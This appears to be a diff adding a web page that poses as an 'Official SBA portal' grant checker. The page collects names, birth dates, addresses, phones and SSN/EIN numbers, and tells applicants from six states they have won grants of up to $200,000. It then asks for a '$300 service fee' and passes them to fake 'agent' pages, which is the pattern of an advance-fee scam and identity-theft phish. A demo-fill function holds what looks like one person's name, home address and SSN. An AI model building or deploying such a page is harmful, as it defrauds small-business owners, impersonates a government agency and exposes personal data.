@@ -1,0 +1,584 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>SBA Grant Check</title>
+<style>
+  :root{
+    --gov-blue: #005ea2;
+    --muted: #f5f5f5;
+    --card-bg: rgba(255,255,255,0.98);
+    --accent: #0b78b4;
+    --success: #2f8f4e;
+    --danger: #c23d3d;
+    --text: #1f2937;
+    --glass: rgba(255,255,255,0.9);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:"Segoe UI",Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  body{
+    background: linear-gradient(135deg,#f9fbff 0%, #eef6ff 100%);
+    color:var(--text);
+    padding:28px;
+    display:flex;
+    align-items:flex-start;
+    justify-content:center;
+    min-height:100vh;
+    overflow-y:auto;
+  }
+
+  /* watermark same as previous page (images2.png) */
+  body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    background: url('images2.png') center/320px no-repeat;
+    opacity:0.04;
+    pointer-events:none;
+    z-index:-1;
+  }
+
+  /* container */
+  .wrap{
+    width:100%;
+    max-width:980px;
+    margin:0 auto;
+  }
+  header{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    background:var(--card-bg);
+    padding:14px 18px;
+    border-radius:10px;
+    box-shadow:0 10px 30px rgba(10,20,40,0.06);
+    border:1px solid #e9eef6;
+  }
+  header img{height:44px;width:44px;border-radius:6px;object-fit:cover}
+  header .title {font-weight:800;color:var(--gov-blue);font-size:18px}
+  header .subtitle {font-size:13px;color:#5b6b7a}
+
+  main.card{
+    margin-top:18px;
+    background:var(--card-bg);
+    border-radius:12px;
+    padding:18px;
+    box-shadow:0 12px 40px rgba(10,20,40,0.06);
+    border:1px solid #eef6ff;
+  }
+
+  .grid{
+    display:grid;
+    grid-template-columns: 1fr 360px;
+    gap:18px;
+    align-items:start;
+  }
+
+  @media (max-width:880px){
+    .grid{grid-template-columns: 1fr}
+  }
+
+  form .row{display:flex;gap:12px}
+  form .col{flex:1}
+  label{display:block;font-size:13px;margin-bottom:6px;font-weight:700;color:#374151}
+  input[type="text"], input[type="tel"], input[type="date"], select{
+    width:100%;padding:10px;border-radius:8px;border:1px solid #d6e6fb;background:white;font-size:14px
+  }
+  .muted{font-size:13px;color:#6b7280}
+  .actions{display:flex;gap:10px;align-items:center;margin-top:12px}
+  button.btn{
+    background:var(--gov-blue);color:white;padding:10px 14px;border-radius:8px;border:none;font-weight:700;cursor:pointer
+  }
+  button.ghost{background:transparent;border:1px solid #d7e7f2;color:var(--gov-blue);padding:10px 12px;border-radius:8px}
+
+  /* right column: info / results area */
+  .panel{
+    background:linear-gradient(180deg,#ffffff,#fbfdff);
+    border-radius:10px;padding:12px;border:1px solid #eef6ff;
+    min-height:120px;
+  }
+  .panel h3{margin:0 0 8px;font-size:15px;color:var(--gov-blue)}
+  .grant-list{display:grid;gap:8px;margin-top:8px}
+  .grant-item{
+    display:flex;justify-content:space-between;align-items:center;padding:10px;border-radius:8px;background:#fff;border:1px solid #eef6ff;cursor:pointer;
+    transition:transform .12s ease,box-shadow .12s ease;
+  }
+  .grant-item:hover{transform:translateY(-3px);box-shadow:0 8px 24px rgba(11,99,183,0.04)}
+  .grant-item.selected{outline:3px solid rgba(0,122,204,0.12);box-shadow:0 10px 30px rgba(0,122,204,0.06)}
+  .amount{font-weight:800;color:var(--gov-blue)}
+  .muted-sm{font-size:13px;color:#6b7280}
+
+  /* modal */
+  .modal-overlay{
+    position:fixed;inset:0;background:rgba(3,7,18,0.6);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px;
+  }
+  .modal{
+    width:100%;max-width:720px;background:white;border-radius:12px;padding:20px;border:1px solid #e8f1ff;box-shadow:0 22px 80px rgba(10,20,40,0.45)
+  }
+  .modal h2{margin:0 0 10px;color:var(--gov-blue)}
+  .modal .lead{font-weight:700;margin-bottom:8px}
+  .modal .notice{padding:12px;border-radius:8px;margin-top:8px}
+  .notice.success{background:#ecfff2;border:1px solid rgba(47,143,78,0.08);color:var(--success)}
+  .notice.fail{background:#fff6f6;border:1px solid rgba(194,61,61,0.08);color:var(--danger)}
+
+  .final-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+  @media (max-width:700px){ .final-grid{grid-template-columns:1fr} }
+
+  .detail-card{background:#fbfdff;padding:12px;border-radius:8px;border:1px solid #eef6ff}
+
+  .modal .actions{display:flex;gap:10px;justify-content:flex-end;margin-top:14px}
+  .cta-primary{background:var(--gov-blue);color:white;padding:10px 14px;border-radius:8px;border:none;cursor:pointer;font-weight:700}
+  .cta-ghost{background:transparent;border:1px solid #d7e7f2;padding:10px 12px;border-radius:8px;color:var(--gov-blue);cursor:pointer}
+
+  /* small helper */
+  .small{font-size:13px;color:#6b7280}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <header role="banner">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0PnTx1m5kMU4Fa4swtSc_IzftBOdrnLokQg&s" alt="SBA logo" />
+      <div style="display:inline-block;vertical-align:middle;margin-left:10px">
+        <div class="title">Small Business — Grant Check</div>
+        <div class="subtitle small">Check availability for grants & eligibility</div>
+      </div>
+    </header>
+
+    <main class="card" role="main" aria-labelledby="pageTitle" style="margin-top:16px">
+      <h1 id="pageTitle" style="margin:0 0 12px;color:var(--gov-blue)">SBA GRANT CHECK</h1>
+
+      <div class="grid" role="region">
+        <!-- LEFT: form -->
+        <section>
+          <form id="checkForm" onsubmit="return handleCheck(event)" novalidate>
+            <div style="display:flex;gap:12px;flex-wrap:wrap">
+              <div style="flex:1;min-width:220px">
+                <label for="name">Full name</label>
+                <input id="name" name="name" type="text" autocomplete="name" placeholder="Jane Doe" required>
+              </div>
+
+              <div style="width:160px;min-width:140px">
+                <label for="dob">Date of birth</label>
+                <input id="dob" name="dob" type="date" required>
+              </div>
+            </div>
+
+            <div style="margin-top:12px">
+              <label for="address">Address</label>
+              <input id="address" name="address" type="text" placeholder="Street, city" required>
+            </div>
+
+            <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap">
+              <div style="flex:1;min-width:160px">
+                <label for="phone">Phone number</label>
+                <input id="phone" name="phone" type="tel" placeholder="e.g., 404-555-0123" required>
+              </div>
+              <div style="flex:1;min-width:160px">
+                <label for="ein">EIN / SSN</label>
+                <input id="ein" name="ein" type="text" placeholder="E.g., 12-3456789" required>
+              </div>
+            </div>
+
+            <div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap">
+              <div style="flex:1;min-width:160px">
+                <label for="business">Business name</label>
+                <input id="business" name="business" type="text" placeholder="Business LLC" required>
+              </div>
+              <div style="width:160px;min-width:120px">
+                <label for="country">Country of origin</label>
+                <input id="country" name="country" type="text" placeholder="e.g., United States" required>
+              </div>
+              <div style="width:160px;min-width:120px">
+                <label for="state">State</label>
+                <input id="state" name="state" type="text" placeholder="e.g., Georgia or GA" required>
+              </div>
+            </div>
+
+            <div class="actions" style="margin-top:14px">
+              <button type="submit" class="btn">Check Availability</button>
+              
+              <div style="flex:1"></div>
+            </div>
+
+            <div id="formError" class="small" style="color:var(--danger);margin-top:8px;display:none"></div>
+          </form>
+
+          <!-- grants area (shows after successful check) -->
+          <div id="grantsArea" style="margin-top:18px;display:none">
+            <h3 style="margin:0;color:var(--gov-blue)">Available grants</h3>
+            <div class="muted small" style="margin-top:6px">Select a grant to continue</div>
+
+            <div id="grantsList" class="grant-list" role="list" style="margin-top:10px"></div>
+
+            <div style="margin-top:12px;display:flex;gap:8px;align-items:center">
+              <button id="selectBtn" class="btn" disabled onclick="confirmSelection()">Select & Continue</button>
+              <div id="selectedInfo" class="muted-sm" aria-live="polite">No grant selected</div>
+            </div>
+          </div>
+        </section>
+
+        <!-- RIGHT: info panel -->
+        <aside>
+          <div class="panel">
+            <h3>How it works</h3>
+            <div class="muted small">Enter your applicant details and click <strong>Check Availability</strong>. If eligible grants are available for your country & state, they'll be listed on the right. Select one to proceed.</div>
+
+            <hr style="border:none;border-top:1px solid #eef6ff;margin:12px 0">
+
+            <div style="display:flex;gap:8px;align-items:center">
+              <div style="width:10px;height:10px;border-radius:50%;background:var(--gov-blue)"></div>
+              <div class="small">Official SBA portal</div>
+            </div>
+
+            <div style="margin-top:10px">
+              <strong>Note</strong>
+              <div class="small muted">Grants are shown for demonstration only. Eligibility rules: you must be from the United States and from an approved state.</div>
+            </div>
+          </div>
+        </aside>
+      </div>
+    </main>
+  </div>
+
+  <!-- Modal -->
+  <div id="modalOverlay" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal" role="document">
+      <h2 id="modalTitle">Grant Decision</h2>
+
+      <div id="modalContent">
+        <!-- dynamic -->
+      </div>
+
+      <div class="actions" style="margin-top:14px">
+        <button id="modalClose" class="cta-ghost" onclick="closeModal()" style="display:none">Close</button>
+        <button id="connectAgent" class="cta-primary" onclick="connectAgent()" style="display:none">Connect to Agent</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+/* ---------- Data & eligibility rules ---------- */
+/* Grants available globally (demo) - amounts in USD */
+const AVAILABLE_GRANTS = [
+  { id: 'g1', title: 'Small Business Growth Grant', amount: 200000 },
+  { id: 'g2', title: 'Community Recovery Grant', amount: 50000 },
+  { id: 'g3', title: 'Innovation Boost Grant', amount: 100000 }
+];
+
+/* Approved states (accepts full name or postal code) */
+const APPROVED_STATES = [
+  'GA','Georgia',
+  'NY','New York',
+  'CA','California',
+  'TX','Texas',
+  'FL','Florida',
+  'IL','Illinois'
+];
+
+/* Utility functions */
+function normalizeCountry(c){
+  if(!c) return '';
+  return c.trim().toLowerCase();
+}
+function normalizeState(s){
+  if(!s) return '';
+  return s.trim().toLowerCase();
+}
+function isUS(country){
+  const c = normalizeCountry(country);
+  return c === 'usa' || c === 'us' || c === 'united states' || c === 'united states of america';
+}
+function stateAllowed(state){
+  if(!state) return false;
+  const s = state.trim().toLowerCase();
+  return APPROVED_STATES.some(a => a.toLowerCase() === s);
+}
+
+/* DOM refs */
+const form = document.getElementById('checkForm');
+const grantsArea = document.getElementById('grantsArea');
+const grantsList = document.getElementById('grantsList');
+const selectBtn = document.getElementById('selectBtn');
+const selectedInfo = document.getElementById('selectedInfo');
+const modalOverlay = document.getElementById('modalOverlay');
+const modalContent = document.getElementById('modalContent');
+const modalClose = document.getElementById('modalClose');
+const connectAgentBtn = document.getElementById('connectAgent');
+const formError = document.getElementById('formError');
+
+let selectedGrantId = null;
+let lastSubmission = null;
+
+/* beep for success (small) */
+function beep(freq=1000, duration=140, type='sine'){
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.type = type;
+    o.frequency.value = freq;
+    o.connect(g);
+    g.connect(ctx.destination);
+    g.gain.setValueAtTime(0.0001, ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.12, ctx.currentTime + 0.01);
+    o.start();
+    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + duration/1000);
+    setTimeout(()=> { try{ o.stop(); ctx.close(); } catch(e){} }, duration + 60);
+  } catch(e){}
+}
+
+/* Demo fill */
+function fillDemo(){
+  document.getElementById('name').value = "Stacy Thomas";
+  document.getElementById('dob').value = "1974-05-16";
+  document.getElementById('address').value = "2589 Laurice Ct, Decatur, GA 30034";
+  document.getElementById('phone').value = "4045796041";
+  document.getElementById('ein').value = "340-68-5556";
+  document.getElementById('business').value = "Stacy Thomas LLC";
+  document.getElementById('country').value = "United States";
+  document.getElementById('state').value = "GA";
+  formError.style.display = 'none';
+}
+
+/* Validate form fields quickly */
+function validateForm(data){
+  if(!data.name) return 'Please enter full name';
+  if(!data.dob) return 'Please enter date of birth';
+  if(!data.address) return 'Please enter address';
+  if(!data.phone) return 'Please enter phone number';
+  if(!data.ein) return 'Please enter EIN/SSN';
+  if(!data.business) return 'Please enter business name';
+  if(!data.country) return 'Please enter country';
+  if(!data.state) return 'Please enter state';
+  return '';
+}
+
+/* Handle check submit */
+function handleCheck(e){
+  e.preventDefault();
+  formError.style.display = 'none';
+
+  const data = {
+    name: document.getElementById('name').value.trim(),
+    dob: document.getElementById('dob').value,
+    address: document.getElementById('address').value.trim(),
+    phone: document.getElementById('phone').value.trim(),
+    ein: document.getElementById('ein').value.trim(),
+    business: document.getElementById('business').value.trim(),
+    country: document.getElementById('country').value.trim(),
+    state: document.getElementById('state').value.trim()
+  };
+
+  const err = validateForm(data);
+  if(err){
+    formError.style.display = 'block';
+    formError.textContent = err;
+    return false;
+  }
+
+  lastSubmission = data;
+
+  // Eligibility quick check: must be from USA and approved state
+  const us = isUS(data.country);
+  const stateOk = stateAllowed(data.state);
+
+  // If not eligible, we still show grants but mark as unavailable (user requested behavior: show list then selection shows not approved)
+  renderGrants(AVAILABLE_GRANTS, {eligible: us && stateOk});
+  grantsArea.style.display = 'block';
+  // scroll to grants
+  setTimeout(()=> {
+    grantsArea.scrollIntoView({behavior:'smooth', block:'center'});
+  }, 120);
+
+  return false;
+}
+
+/* Render grants list */
+function renderGrants(list, opts = {eligible:true}){
+  grantsList.innerHTML = '';
+  selectedGrantId = null;
+  selectBtn.disabled = true;
+  selectedInfo.textContent = 'No grant selected';
+
+  list.forEach(g => {
+    const item = document.createElement('div');
+    item.className = 'grant-item';
+    item.setAttribute('role','listitem');
+    item.tabIndex = 0;
+    item.innerHTML = `<div><div style="font-weight:800">${escapeHtml(g.title)}</div><div class="small muted-sm">Terms & conditions apply</div></div><div class="amount">$${numberWithCommas(g.amount)}</div>`;
+    item.addEventListener('click', () => {
+      // select
+      document.querySelectorAll('.grant-item').forEach(el => el.classList.remove('selected'));
+      item.classList.add('selected');
+      selectedGrantId = g.id;
+      selectBtn.disabled = false;
+      selectedInfo.textContent = `${g.title} — $${numberWithCommas(g.amount)}`;
+    });
+    // keyboard accessible
+    item.addEventListener('keydown', (ev) => { if(ev.key === 'Enter') item.click(); });
+    grantsList.appendChild(item);
+  });
+}
+
+/* confirm selection and open modal (decision) */
+function confirmSelection(){
+  if(!selectedGrantId) return;
+  const grant = AVAILABLE_GRANTS.find(g => g.id === selectedGrantId);
+  if(!grant) return;
+
+  // Decide eligibility (based on lastSubmission)
+  const data = lastSubmission;
+  if(!data){
+    alert('Form data missing — please check again.');
+    return;
+  }
+
+  const us = isUS(data.country);
+  const stateOk = stateAllowed(data.state);
+
+  // Build modal content
+  modalContent.innerHTML = '';
+  modalClose.style.display = 'none';
+  connectAgentBtn.style.display = 'none';
+  connectAgentBtn.disabled = false;
+
+  if(!us){
+    // not from USA
+    const div = document.createElement('div');
+    div.className = 'notice fail';
+    div.textContent = 'Grant not approved: Applicant is not from the United States.';
+    modalContent.appendChild(div);
+
+    // details for clarity
+    modalContent.appendChild(infoPanel(data, grant, false, 'Applicant must be from the United States to be eligible.'));
+    modalClose.style.display = 'inline-block';
+    modalOverlay.style.display = 'flex';
+    return;
+  }
+
+  if(!stateOk){
+    const div = document.createElement('div');
+    div.className = 'notice fail';
+    div.textContent = 'Grant not approved: Your state is not eligible for this grant program.';
+    modalContent.appendChild(div);
+
+    modalContent.appendChild(infoPanel(data, grant, false, 'Only applicants from certain states (GA, NY, CA, TX, FL, IL) are eligible for this grant.'));
+    modalClose.style.display = 'inline-block';
+    modalOverlay.style.display = 'flex';
+    return;
+  }
+
+  // APPROVED
+  const div = document.createElement('div');
+  div.className = 'notice success';
+  div.innerHTML = `<strong>Congratulations — you are eligible for, </strong><br>The selected amount: <span style="font-weight:900;color:var(--gov-blue)">$${numberWithCommas(grant.amount)}</span>`;
+  modalContent.appendChild(div);
+
+  // add details and note about connecting to agent
+  modalContent.appendChild(infoPanel(data, grant, true, 'You will be redirected to an available agent to activate your grant application including paperwork and documentations. you will pay a one time service fee of $300.'));
+
+  // show connect CTA
+  modalClose.style.display = 'none';
+  connectAgentBtn.style.display = 'inline-block';
+  modalOverlay.style.display = 'flex';
+
+  // play success beep
+  beep(1200,160,'sine');
+}
+
+/* helper: create info panel for modal (applicant + bank-like selection info) */
+function infoPanel(data, grant, approved, note){
+  const wrap = document.createElement('div');
+  wrap.className = 'final-grid';
+
+  const app = document.createElement('div');
+  app.className = 'detail-card';
+  app.innerHTML = `<strong>Applicant</strong>
+    <div style="margin-top:8px;font-weight:700">${escapeHtml(data.name)}</div>
+    <div class="small">${escapeHtml(data.address)}</div>
+    <div class="small">DOB: ${escapeHtml(data.dob)} • Phone: ${escapeHtml(data.phone)}</div>
+    <div class="small">EIN/SSN: ${escapeHtml(data.ein)}</div>`;
+
+  const grantc = document.createElement('div');
+  grantc.className = 'detail-card';
+  grantc.innerHTML = `<strong>Selected grant</strong>
+    <div style="margin-top:8px;font-weight:800">${escapeHtml(grant.title)}</div>
+    <div class="small">Amount: <span style="font-weight:900;color:var(--gov-blue)">$${numberWithCommas(grant.amount)}</span></div>
+    <div style="margin-top:8px" class="small">${escapeHtml(note)}</div>`;
+
+  wrap.appendChild(app);
+  wrap.appendChild(grantc);
+  return wrap;
+}
+
+/* Connect to agent simulation */
+function connectAgent(){
+  // simulate redirect to agent: here we open a small mock list and show connect button.
+  modalContent.innerHTML = '';
+  const heading = document.createElement('div');
+  heading.className = 'lead';
+  heading.style.fontWeight = '800';
+  heading.textContent = 'Connecting you to an available agent...';
+  modalContent.appendChild(heading);
+
+  const loading = document.createElement('div');
+  loading.className = 'small';
+  loading.textContent = 'Please wait — finding the next available agent.';
+  modalContent.appendChild(loading);
+
+  // small faux agent list after a short delay
+  setTimeout(() => {
+    modalContent.innerHTML = '';
+    const listWrap = document.createElement('div');
+    listWrap.innerHTML = `<div class="small" style="font-weight:800;margin-bottom:8px">Available Agents</div>`;
+    const agents = [
+      { name: 'Agent Maria J', time: '2 mins', userId: 'user1.html' },
+      { name: 'Agent Lewis R', time: '5 mins', userId: 'user2.html' },
+      { name: 'Agent Chen K', time: '10 mins', userId: 'user3.html' }
+    ];
+    agents.forEach(a => {
+      const node = document.createElement('div');
+      node.style.padding = '10px';
+      node.style.marginBottom = '8px';
+      node.style.border = '1px solid #eef6ff';
+      node.style.borderRadius = '8px';
+      node.innerHTML = `<div style="font-weight:800">${a.name}</div><div class="small">Available in ${a.time}</div>
+        <div style="margin-top:6px"><button class="cta-primary" onclick="simulateAgentConnect('${a.name}', '${a.userId}')">Connect</button></div>`;
+      listWrap.appendChild(node);
+    });
+    modalContent.appendChild(listWrap);
+    modalClose.style.display = 'inline-block';
+    connectAgentBtn.style.display = 'none';
+  }, 900);
+}
+
+/* simulate connecting */
+function simulateAgentConnect(name, userId){
+  modalContent.innerHTML = `<div class="lead" style="font-weight:800">You are now connected to ${escapeHtml(name)}</div>
+    <div class="small" style="margin-top:8px">An agent will guide you through activating your grant application and paper work.</div>`;
+  // beep
+  beep(900,160,'sine');
+  // redirect to the user's specific page
+  window.location.href = userId; // This will redirect to the respective user page like 'user1.html'
+  // show close CTA
+  modalClose.style.display = 'inline-block';
+}
+
+/* utilities */
+function escapeHtml(s){ if(!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function numberWithCommas(x){ return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ","); }
+
+/* close modal */
+function closeModal(){ modalOverlay.style.display = 'none'; modalContent.innerHTML = ''; connectAgentBtn.style.display = 'none'; modalClose.style.display = 'none'; }
+
+/* Accessibility: allow Esc to close */
+document.addEventListener('keydown', (ev) => {
+  if(ev.key === 'Escape' && modalOverlay.style.display === 'flex'){ closeModal(); }
+});
+
+/* initial demo call: none */
+
+</script>
+</body>
+</html>
